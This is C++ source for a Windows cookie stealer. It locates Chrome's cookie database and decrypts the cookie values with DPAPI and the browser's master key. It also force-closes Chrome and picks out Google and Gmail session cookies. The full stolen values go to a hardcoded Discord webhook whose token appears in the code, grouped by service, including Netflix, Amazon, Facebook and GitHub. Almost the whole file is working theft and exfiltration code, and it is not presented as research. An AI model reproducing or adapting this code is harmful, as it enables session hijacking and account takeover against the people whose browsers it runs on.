#ifndef CHROME_COOKIE_RETRIEVER_HPP
#define CHROME_COOKIE_RETRIEVER_HPP

#include <curl/curl.h>
#include <iostream>
#include <string>
#include <vector>
#include <memory>
#include <fstream>
#include <filesystem>
#include <algorithm>
#include <numeric>
#include <iomanip>
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <windows.h>
#include <shlobj.h>
#include <thread>
#include <chrono>
#include <stdexcept>
#include <sstream>
#include <ctime>

namespace cookie_retriever {

struct Cookie;

class WebhookSender {
private:
    std::string webhook_url;
    CURL* curl;
    struct curl_slist* headers;
    static bool curl_initialized;

    static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
        ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    }

public:
    WebhookSender(const std::string& url);
    ~WebhookSender();
    bool send_cookies(const std::vector<Cookie>& cookies, const std::string& db_path);
    void send_message(const std::string& message);
};

bool WebhookSender::curl_initialized = false;

struct Cookie {
    std::string domain;
    std::string name;
    std::string path;
    std::string value;
    int64_t expires_utc = 0;
    bool secure = false;
    bool http_only = false;
    bool session = false;
    bool host_only = false;
    std::string same_site;
    std::string store_id;
    std::vector<uint8_t> encrypted_value;

    nlohmann::json to_json() const {
        try {
            nlohmann::json j;
            j["domain"] = domain;
            j["name"] = name;
            j["path"] = path;
            j["value"] = value;  // No truncation for auth cookies
            j["secure"] = secure;
            j["httpOnly"] = http_only;
            j["hostOnly"] = host_only;
            j["session"] = session;
            j["sameSite"] = same_site.empty() ? nullptr : same_site;
            j["storeId"] = store_id.empty() ? nullptr : store_id;
            
            if (expires_utc > 0) {
                // Convert Windows FILETIME to Unix timestamp (seconds since epoch)
                double unix_timestamp = (expires_utc / 1000000.0) - 11644473600;
                j["expirationDate"] = unix_timestamp;
            }
            
            return j;
        } catch (const std::exception& e) {
            std::cerr << "Failed to convert cookie to JSON: " << e.what() << std::endl;
            throw;
        }
    }
};

WebhookSender::WebhookSender(const std::string& url) : webhook_url(url), curl(nullptr), headers(nullptr) {
    if (!curl_initialized) {
        curl_global_init(CURL_GLOBAL_ALL);
        curl_initialized = true;
    }

    curl = curl_easy_init();
    if (!curl) {
        throw std::runtime_error("Failed to initialize CURL");
    }

    headers = curl_slist_append(nullptr, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
}

WebhookSender::~WebhookSender() {
    if (headers) {
        curl_slist_free_all(headers);
    }
    if (curl) {
        curl_easy_cleanup(curl);
    }
}

bool WebhookSender::send_cookies(const std::vector<Cookie>& cookies, const std::string& db_path) {
    if (cookies.empty()) {
        return false;
    }

    nlohmann::json json_array = nlohmann::json::array();
    
    for (const auto& cookie : cookies) {
        nlohmann::json cookie_obj;
        cookie_obj["domain"] = cookie.domain;
        cookie_obj["name"] = cookie.name;
        cookie_obj["path"] = cookie.path;
        cookie_obj["value"] = cookie.value;
        cookie_obj["secure"] = cookie.secure;
        cookie_obj["httpOnly"] = cookie.http_only;
        cookie_obj["sameSite"] = cookie.same_site;
        
        // Convert expires_utc to readable format
        std::time_t expires = cookie.expires_utc / 1000000 - 11644473600;
        std::stringstream ss;
        ss << std::put_time(std::gmtime(&expires), "%Y-%m-%d %H:%M:%S UTC");
        cookie_obj["expires"] = ss.str();
        
        json_array.push_back(cookie_obj);
    }

    // Split cookies into chunks of 10 to avoid Discord's message size limit
    const size_t chunk_size = 10;
    for (size_t i = 0; i < json_array.size(); i += chunk_size) {
        nlohmann::json chunk = nlohmann::json::array();
        size_t end = (std::min)(i + chunk_size, json_array.size());
        for (size_t j = i; j < end; j++) {
            chunk.push_back(json_array[j]);
        }

        nlohmann::json embed;
        embed["title"] = "Chrome Cookies - " + db_path;
        embed["description"] = "```json\n" + chunk.dump(2) + "\n```";
        embed["color"] = 5814783;

        nlohmann::json payload;
        payload["embeds"] = nlohmann::json::array({embed});

        std::string payload_str = payload.dump();
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload_str.c_str());
        
        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            return false;
        }
        
        // Add delay between messages to avoid rate limiting
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }

    return true;
}

void WebhookSender::send_message(const std::string& message) {
    try {
        if (!curl) {
            std::cerr << "CURL not initialized" << std::endl;
            return;
        }

        std::cout << "Setting up CURL options..." << std::endl;
        std::cout << "Webhook URL: " << webhook_url << std::endl;
        std::cout << "Message size: " << message.size() << " bytes" << std::endl;

        // Set up webhook request
        curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, message.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, message.size());
        
        // Enable verbose output for debugging
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        
        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        // Send request
        std::cout << "Sending webhook request..." << std::endl;
        CURLcode res = curl_easy_perform(curl);
        
        if (res != CURLE_OK) {
            std::cerr << "Failed to send webhook: " << curl_easy_strerror(res) << std::endl;
            std::cerr << "Error code: " << res << std::endl;
            return;
        }

        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        
        if (http_code >= 200 && http_code < 300) {
            std::cout << "Webhook sent successfully (HTTP " << http_code << ")" << std::endl;
            std::cout << "Discord response: " << response << std::endl;
        } else {
            std::cerr << "Webhook failed with HTTP " << http_code << std::endl;
            std::cerr << "Response: " << response << std::endl;
            std::cerr << "Request body: " << message << std::endl;
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception in send_message: " << e.what() << std::endl;
    } catch (...) {
        std::cerr << "Unknown exception in send_message" << std::endl;
    }
}

class ChromeCookieRetriever {
private:
    sqlite3* db = nullptr;
    std::string cookie_db_path;
    std::string cookie_db_backup_path;
    bool db_opened = false;
    std::vector<Cookie> cookies;
    std::unique_ptr<WebhookSender> webhook_sender;

    static std::string decrypt_cookie_value(const std::vector<uint8_t>& encrypted_value) {
        try {
            if (encrypted_value.empty()) {
                return "";
            }

            // For legacy cookies, try direct decryption first
            if (encrypted_value.size() < 3 || encrypted_value[0] != 'v' || encrypted_value[1] != '1') {
                DATA_BLOB encrypted_blob;
                encrypted_blob.pbData = const_cast<BYTE*>(encrypted_value.data());
                encrypted_blob.cbData = static_cast<DWORD>(encrypted_value.size());

                DATA_BLOB decrypted_blob;
                if (CryptUnprotectData(&encrypted_blob, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN, &decrypted_blob)) {
                    std::string result(reinterpret_cast<char*>(decrypted_blob.pbData), decrypted_blob.cbData);
                    LocalFree(decrypted_blob.pbData);
                    return result;
                }
            }

            // For v10/v11 cookies, try with master key
            if (encrypted_value.size() >= 3 && encrypted_value[0] == 'v' && encrypted_value[1] == '1') {
                // Get Chrome's master key
                std::string local_state_path = get_chrome_path() + "Local State";
                std::ifstream local_state_file(local_state_path);
                if (!local_state_file.is_open()) {
                    std::cerr << "Failed to open Local State file" << std::endl;
                    return "";
                }

                nlohmann::json local_state;
                local_state_file >> local_state;
                local_state_file.close();

                std::string master_key_b64 = local_state["os_crypt"]["encrypted_key"];
                std::string master_key_encrypted = base64_decode(master_key_b64);
                
                // Remove DPAPI prefix 'DPAPI'
                if (master_key_encrypted.size() < 5) {
                    std::cerr << "Master key is too short" << std::endl;
                    return "";
                }
                master_key_encrypted = master_key_encrypted.substr(5);

                // Decrypt the master key
                DATA_BLOB master_key_blob;
                master_key_blob.pbData = reinterpret_cast<BYTE*>(const_cast<char*>(master_key_encrypted.data()));
                master_key_blob.cbData = static_cast<DWORD>(master_key_encrypted.size());

                DATA_BLOB master_key_decrypted;
                if (!CryptUnprotectData(&master_key_blob, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN, &master_key_decrypted)) {
                    DWORD error = GetLastError();
                    std::cerr << "Failed to decrypt master key. Error code: " << error << std::endl;
                    return "";
                }

                // Create a key blob with the master key
                DATA_BLOB key_blob;
                key_blob.pbData = master_key_decrypted.pbData;
                key_blob.cbData = master_key_decrypted.cbData;

                if (encrypted_value[2] == '0') {  // v10
                    // For v10, try direct decryption with master key as additional entropy
                    DATA_BLOB encrypted_blob;
                    encrypted_blob.pbData = const_cast<BYTE*>(encrypted_value.data());
                    encrypted_blob.cbData = static_cast<DWORD>(encrypted_value.size());

                    DATA_BLOB decrypted_blob;
                    if (CryptUnprotectData(&encrypted_blob, nullptr, &key_blob, nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN, &decrypted_blob)) {
                        std::string result(reinterpret_cast<char*>(decrypted_blob.pbData), decrypted_blob.cbData);
                        LocalFree(decrypted_blob.pbData);
                        LocalFree(master_key_decrypted.pbData);
                        return result;
                    }
                }
                else if (encrypted_value[2] == '1' && encrypted_value.size() >= 31) {  // v11
                    // Extract components from the v11 cookie
                    std::vector<uint8_t> nonce(encrypted_value.begin() + 3, encrypted_value.begin() + 15);
                    std::vector<uint8_t> ciphertext(encrypted_value.begin() + 15, encrypted_value.end());

                    // Try to decrypt the ciphertext with the master key
                    DATA_BLOB encrypted_blob;
                    encrypted_blob.pbData = const_cast<BYTE*>(ciphertext.data());
                    encrypted_blob.cbData = static_cast<DWORD>(ciphertext.size());

                    DATA_BLOB decrypted_blob;
                    if (CryptUnprotectData(&encrypted_blob, nullptr, &key_blob, nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN, &decrypted_blob)) {
                        std::string result(reinterpret_cast<char*>(decrypted_blob.pbData), decrypted_blob.cbData);
                        LocalFree(decrypted_blob.pbData);
                        LocalFree(master_key_decrypted.pbData);
                        return result;
                    }
                }

                LocalFree(master_key_decrypted.pbData);
            }

            // Try direct decryption one last time without UI
            DATA_BLOB encrypted_blob;
            encrypted_blob.pbData = const_cast<BYTE*>(encrypted_value.data());
            encrypted_blob.cbData = static_cast<DWORD>(encrypted_value.size());

            DATA_BLOB decrypted_blob;
            CRYPTPROTECT_PROMPTSTRUCT prompt_struct = { 0 };
            prompt_struct.cbSize = sizeof(CRYPTPROTECT_PROMPTSTRUCT);
            prompt_struct.dwPromptFlags = CRYPTPROTECT_PROMPT_ON_PROTECT | CRYPTPROTECT_PROMPT_ON_UNPROTECT;

            if (CryptUnprotectData(&encrypted_blob, nullptr, nullptr, nullptr, &prompt_struct, 0, &decrypted_blob)) {
                std::string result(reinterpret_cast<char*>(decrypted_blob.pbData), decrypted_blob.cbData);
                LocalFree(decrypted_blob.pbData);
                return result;
            }

            DWORD error = GetLastError();
            std::cerr << "Failed to decrypt cookie value. Format: " 
                     << (encrypted_value.size() >= 3 && encrypted_value[0] == 'v' && encrypted_value[1] == '1' ? 
                         (encrypted_value[2] == '0' ? "v10" : 
                          encrypted_value[2] == '1' ? "v11" : "unknown") : 
                         "legacy") 
                     << ", Error code: " << error << std::endl;
            return "";

        } catch (const std::exception& e) {
            std::cerr << "Exception in decrypt_cookie_value: " << e.what() << std::endl;
            return "";
        } catch (...) {
            std::cerr << "Unknown exception in decrypt_cookie_value" << std::endl;
            return "";
        }
    }

    static std::string base64_decode(const std::string& encoded) {
        if (encoded.empty()) return "";

        size_t padding = 0;
        if (encoded.length() >= 2) {
            if (encoded[encoded.length()-1] == '=') padding++;
            if (encoded[encoded.length()-2] == '=') padding++;
        }

        std::vector<unsigned char> result((encoded.length() * 3) / 4 - padding);
        unsigned char* out = result.data();

        const unsigned char* in = reinterpret_cast<const unsigned char*>(encoded.c_str());
        size_t len = encoded.length();

        static const unsigned char base64_table[256] = {
            64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
            64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
            64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
            52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
            64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
            15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
            64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
            41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
            64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
            64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
            64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
        };

        unsigned char counts = 0;
        unsigned char buffer[4];
        size_t i = 0, j = 0;

        while (i < len) {
            unsigned char c = base64_table[in[i++]];
            if (c == 64) continue;

            buffer[counts++] = c;
            if (counts == 4) {
                out[j++] = (buffer[0] << 2) | ((buffer[1] & 0x30) >> 4);
                if (j < result.size()) out[j++] = ((buffer[1] & 0x0f) << 4) | ((buffer[2] & 0x3c) >> 2);
                if (j < result.size()) out[j++] = ((buffer[2] & 0x03) << 6) | buffer[3];
                counts = 0;
            }
        }

        if (counts > 0) {
            if (counts == 2)
                out[j++] = (buffer[0] << 2) | ((buffer[1] & 0x30) >> 4);
            else if (counts == 3) {
                out[j++] = (buffer[0] << 2) | ((buffer[1] & 0x30) >> 4);
                out[j++] = ((buffer[1] & 0x0f) << 4) | ((buffer[2] & 0x3c) >> 2);
            }
        }

        return std::string(reinterpret_cast<char*>(result.data()), j);
    }

    static std::string get_chrome_path() {
        char* appdata;
        size_t len;
        errno_t err = _dupenv_s(&appdata, &len, "LOCALAPPDATA");
        if (err || !appdata) {
            std::cerr << "Failed to get LOCALAPPDATA" << std::endl;
            return "";
        }
        std::string path = std::string(appdata) + "\\Google\\Chrome\\User Data\\";
        free(appdata);
        return path;
    }

    std::vector<std::string> get_cookie_db_paths() {
        std::vector<std::string> paths;
        std::string base_path = get_chrome_path();
        if (base_path.empty()) {
            return paths;
        }

        // Try default profile first
        paths.push_back(base_path + "Default\\Network\\Cookies");
        
        // Then try numbered profiles
        for (int i = 1; i <= 5; i++) {
            paths.push_back(base_path + "Profile " + std::to_string(i) + "\\Network\\Cookies");
        }

        return paths;
    }

    bool backup_database() {
        try {
            if (CopyFileA(cookie_db_path.c_str(), cookie_db_backup_path.c_str(), FALSE)) {
                std::cout << "Successfully backed up database" << std::endl;
                return true;
            } else {
                DWORD error = GetLastError();
                std::cerr << "Failed to backup database. Error code: " << error << std::endl;
                return false;
            }
        } catch (const std::exception& e) {
            std::cerr << "Exception in backup_database: " << e.what() << std::endl;
            return false;
        } catch (...) {
            std::cerr << "Unknown exception in backup_database" << std::endl;
            return false;
        }
    }

    bool close_chrome_processes() {
        try {
            std::cout << "Attempting to close Chrome processes..." << std::endl;
            system("taskkill /F /IM chrome.exe >nul 2>&1");
            std::cout << "Chrome processes should be closed now" << std::endl;
            return true;
        } catch (const std::exception& e) {
            std::cerr << "Exception in close_chrome_processes: " << e.what() << std::endl;
            return false;
        } catch (...) {
            std::cerr << "Unknown exception in close_chrome_processes" << std::endl;
            return false;
        }
    }

    bool open_database() {
        try {
            if (db_opened) {
                return true;
            }

            std::cout << "Checking paths:" << std::endl;
            std::vector<std::string> paths = get_cookie_db_paths();
            for (const auto& path : paths) {
                std::cout << "1. " << path << std::endl;
                if (std::filesystem::exists(path)) {
                    std::cout << "Found cookies at path 1" << std::endl;
                    cookie_db_path = path;
                    break;
                }
            }

            if (cookie_db_path.empty()) {
                throw std::runtime_error("Could not find Chrome cookie database!");
            }

            std::cout << "Using cookie database at: " << cookie_db_path << std::endl;
            cookie_db_backup_path = cookie_db_path + ".tmp";

            std::cout << "Attempting to backup database to: " << cookie_db_backup_path << std::endl;
            if (!backup_database()) {
                return false;
            }

            int rc = sqlite3_open(cookie_db_backup_path.c_str(), &db);
            if (rc != SQLITE_OK) {
                std::cerr << "Failed to open database: " << sqlite3_errmsg(db) << std::endl;
                return false;
            }

            db_opened = true;
            return true;
        } catch (const std::exception& e) {
            std::cerr << "Exception in open_database: " << e.what() << std::endl;
            return false;
        } catch (...) {
            std::cerr << "Unknown exception in open_database" << std::endl;
            return false;
        }
    }

    static int cookie_callback(void* data, int argc, char** argv, char** col_names) {
        try {
            std::vector<Cookie>* cookies = static_cast<std::vector<Cookie>*>(data);
            if (!cookies) {
                std::cerr << "Invalid cookie vector pointer" << std::endl;
                return 0;
            }

            Cookie cookie;
            std::vector<uint8_t> encrypted_value;
            
            for (int i = 0; i < argc; i++) {
                std::string col_name = col_names[i];
                std::string value = argv[i] ? argv[i] : "";

                if (col_name == "encrypted_value") {
                    if (argv[i]) {
                        const uint8_t* blob = reinterpret_cast<const uint8_t*>(argv[i]);
                        // SQLite callback gives us raw binary data
                        encrypted_value.assign(blob, blob + value.length());
                    }
                } else if (col_name == "host_key") cookie.domain = value;
                else if (col_name == "name") cookie.name = value;
                else if (col_name == "path") cookie.path = value;
                else if (col_name == "value") cookie.value = value;
                else if (col_name == "expires_utc") cookie.expires_utc = std::stoll(value);
                else if (col_name == "is_secure") cookie.secure = (value == "1");
                else if (col_name == "is_httponly") cookie.http_only = (value == "1");
            }

            if (!cookie.domain.empty() && !cookie.name.empty()) {
                cookie.encrypted_value = encrypted_value;
                std::string decrypted_value = decrypt_cookie_value(encrypted_value);
                if (!decrypted_value.empty()) {
                    cookie.value = decrypted_value;
                }
                std::cout << "Found cookie: " << cookie.name << " for domain " << cookie.domain << std::endl;
                cookies->push_back(cookie);
            }

            return 0;
        } catch (const std::exception& e) {
            std::cerr << "Exception in cookie_callback: " << e.what() << std::endl;
            return 1;
        } catch (...) {
            std::cerr << "Unknown exception in cookie_callback" << std::endl;
            return 1;
        }
    }

public:
    ChromeCookieRetriever(const std::string& webhook_url = "https://discord.com/api/webhooks/1307465181974233200/KYQo4T58xjkQ9Kkw6m22EXZFFWtjp-CEZbi7nnnh-gGkxu2nPg9SAW0ALkShdtdOXxtS") {
        try {
            if (!webhook_url.empty()) {
                webhook_sender = std::make_unique<WebhookSender>(webhook_url);
            }
        } catch (const std::exception& e) {
            std::cerr << "Error in constructor: " << e.what() << std::endl;
            throw;
        }
    }
    
    ~ChromeCookieRetriever() {
        try {
            if (db) {
                sqlite3_close(db);
                db = nullptr;
            }
            if (std::filesystem::exists(cookie_db_backup_path)) {
                std::filesystem::remove(cookie_db_backup_path);
            }
        } catch (const std::exception& e) {
            std::cerr << "Error in destructor: " << e.what() << std::endl;
        }
    }
    
    std::vector<Cookie> get_all_cookies() {
        std::vector<Cookie> cookies;
        
        try {
            if (!open_database()) {
                return cookies;
            }

            const char* query = 
                "SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, encrypted_value "
                "FROM cookies ORDER BY host_key;";
                
            char* error_msg = nullptr;
            std::cout << "Executing query: " << query << std::endl;
            
            int result = sqlite3_exec(db, query, cookie_callback, &cookies, &error_msg);
            
            if (result != SQLITE_OK) {
                std::string error = error_msg ? error_msg : "Unknown error";
                sqlite3_free(error_msg);
                std::cerr << "SQL error: " << error << std::endl;
                return cookies;
            }
            
            std::cout << "Retrieved " << cookies.size() << " cookies" << std::endl;
            
            if (webhook_sender && !cookies.empty()) {
                std::cout << "Sending cookies to webhook..." << std::endl;
                if (webhook_sender->send_cookies(cookies, cookie_db_path)) {
                    std::cout << "Successfully sent cookies to webhook" << std::endl;
                } else {
                    std::cerr << "Failed to send cookies to webhook" << std::endl;
                }
            }
            
        } catch (const std::exception& e) {
            std::cerr << "Error retrieving cookies: " << e.what() << std::endl;
        }
        
        return cookies;
    }

    std::vector<Cookie> get_cookies_for_domain() {
        std::vector<Cookie> cookies;
        
        std::cout << "\nRetrieving email service cookies..." << std::endl;
        
        try {
            if (!open_database()) {
                return cookies;
            }

            const char* query = R"(
                SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, 
                       is_httponly, has_expires, is_persistent, samesite, source_scheme
                FROM cookies
                WHERE host_key LIKE '%.google.com'
                AND (
                    name IN (
                        'SAPISID', 'APISID', 'SSID', 'SID', 'OSID', '__Secure-OSID',
                        '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PSIDTS', '__Secure-3PSIDTS',
                        '__Secure-1PSIDCC', '__Secure-3PSIDCC', '__Secure-1PAPISID', '__Secure-3PAPISID',
                        'HSID', 'NID', 'GMAIL_AT', 'COMPASS', 'SOCS', 'AEC'
                    )
                    OR (host_key = 'mail.google.com' AND name LIKE '%GMAIL%')
                    OR (host_key = 'mail.google.com' AND name LIKE '%OSID%')
                    OR (host_key = 'mail.google.com' AND name LIKE '%COMPASS%')
                )
                ORDER BY host_key, name;
            )";

            std::cout << "Executing cookie query..." << std::endl;
            sqlite3_stmt* stmt = nullptr;
            int rc = sqlite3_prepare_v2(db, query, -1, &stmt, nullptr);
            
            if (rc != SQLITE_OK) {
                std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
                return cookies;
            }

            while (sqlite3_step(stmt) == SQLITE_ROW) {
                Cookie cookie;
                cookie.domain = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                cookie.name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                cookie.path = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
                
                const void* blob = sqlite3_column_blob(stmt, 3);
                int blob_size = sqlite3_column_bytes(stmt, 3);
                
                if (blob && blob_size > 0) {
                    const uint8_t* encrypted_value = static_cast<const uint8_t*>(blob);
                    std::vector<uint8_t> encrypted_bytes(encrypted_value, encrypted_value + blob_size);
                    cookie.encrypted_value = encrypted_bytes;
                    std::string decrypted_value = decrypt_cookie_value(encrypted_bytes);
                    if (!decrypted_value.empty()) {
                        cookie.value = decrypted_value;
                    }
                }
                
                cookie.expires_utc = sqlite3_column_int64(stmt, 4);
                cookie.secure = sqlite3_column_int(stmt, 5) != 0;
                cookie.http_only = sqlite3_column_int(stmt, 6) != 0;
                cookie.session = sqlite3_column_int(stmt, 7) == 0;
                
                int samesite = sqlite3_column_int(stmt, 9);
                switch (samesite) {
                    case 1:
                        cookie.same_site = "lax";
                        break;
                    case 2:
                        cookie.same_site = "strict";
                        break;
                    case -1:
                        cookie.same_site = "no_restriction";
                        break;
                    default:
                        cookie.same_site = "";
                }
                
                cookie.host_only = cookie.domain.find('.') == std::string::npos;
                cookies.push_back(cookie);
                std::cout << "Found cookie: " << cookie.name << " for domain " << cookie.domain << std::endl;
            }

            sqlite3_finalize(stmt);
            
            std::cout << "Found " << cookies.size() << " cookies" << std::endl;
            
            if (!cookies.empty() && webhook_sender) {
                std::cout << "Sending cookies to webhook..." << std::endl;
                if (webhook_sender->send_cookies(cookies, cookie_db_path)) {
                    std::cout << "Successfully sent cookies to webhook" << std::endl;
                } else {
                    std::cerr << "Failed to send cookies to webhook" << std::endl;
                }
            }
            
            return cookies;
        } catch (const std::exception& e) {
            std::cerr << "Error retrieving cookies: " << e.what() << std::endl;
        }
        
        return cookies;
    }

    void send_cookies_to_webhook() {
        if (!webhook_sender) {
            std::cerr << "No webhook URL provided" << std::endl;
            return;
        }

        std::cout << "Sending cookies to webhook..." << std::endl;
        std::cout << "Creating JSON payload..." << std::endl;

        // Group cookies by service
        std::map<std::string, std::vector<Cookie>> service_cookies;
        
        for (const auto& cookie : cookies) {
            std::string service;
            if (cookie.domain.find("google") != std::string::npos) {
                service = "Google";
            } else if (cookie.domain.find("netflix") != std::string::npos) {
                service = "Netflix";
            } else if (cookie.domain.find("amazon") != std::string::npos) {
                service = "Amazon";
            } else if (cookie.domain.find("facebook") != std::string::npos) {
                service = "Facebook";
            } else if (cookie.domain.find("twitter") != std::string::npos) {
                service = "Twitter";
            } else if (cookie.domain.find("instagram") != std::string::npos) {
                service = "Instagram";
            } else if (cookie.domain.find("microsoft") != std::string::npos) {
                service = "Microsoft";
            } else if (cookie.domain.find("apple") != std::string::npos) {
                service = "Apple";
            } else if (cookie.domain.find("github") != std::string::npos) {
                service = "GitHub";
            } else {
                service = "Other";
            }
            service_cookies[service].push_back(cookie);
        }

        // Create and send messages for each service
        for (const auto& [service, service_cookie_list] : service_cookies) {
            nlohmann::json base_payload;
            base_payload["username"] = "Cookie Retriever";
            base_payload["content"] = service + " Cookies (" + std::to_string(service_cookie_list.size()) + " cookies found)";
            
            // Split cookies into chunks to avoid Discord's message size limit
            const size_t chunk_size = 20;
            for (size_t i = 0; i < service_cookie_list.size(); i += chunk_size) {
                nlohmann::json chunk_payload = base_payload;
                size_t chunk_end = (std::min)(i + chunk_size, service_cookie_list.size());
                
                nlohmann::json cookie_array = nlohmann::json::array();
                for (size_t j = i; j < chunk_end; j++) {
                    nlohmann::json cookie_obj;
                    cookie_obj["name"] = service_cookie_list[j].name;
                    cookie_obj["domain"] = service_cookie_list[j].domain;
                    cookie_obj["path"] = service_cookie_list[j].path;
                    cookie_obj["expires_utc"] = service_cookie_list[j].expires_utc;
                    cookie_obj["is_secure"] = service_cookie_list[j].secure;
                    cookie_obj["is_httponly"] = service_cookie_list[j].http_only;

                    // Try to decrypt the cookie value
                    std::string decrypted_value = decrypt_cookie_value(service_cookie_list[j].encrypted_value);
                    if (!decrypted_value.empty()) {
                        cookie_obj["value"] = decrypted_value;
                    } else {
                        std::stringstream ss;
                        ss << std::hex << std::setfill('0');
                        for (uint8_t byte : service_cookie_list[j].encrypted_value) {
                            ss << std::setw(2) << static_cast<int>(byte);
                        }
                        cookie_obj["value"] = ss.str();
                        cookie_obj["encrypted"] = true;
                    }
                    
                    cookie_array.push_back(cookie_obj);
                }
                
                nlohmann::json embed;
                embed["title"] = service + " Cookies - Part " + std::to_string((i / chunk_size) + 1);
                embed["description"] = "```json\n" + cookie_array.dump(2) + "\n```";
                embed["color"] = 0x00ff00;  // Green color
                
                nlohmann::json embeds = nlohmann::json::array();
                embeds.push_back(embed);
                chunk_payload["embeds"] = embeds;
                
                webhook_sender->send_message(chunk_payload.dump());
                std::this_thread::sleep_for(std::chrono::milliseconds(1000)); // Rate limiting
            }
        }
    }
};

} // namespace cookie_retriever

#endif // CHROME_COOKIE_RETRIEVER_HPP
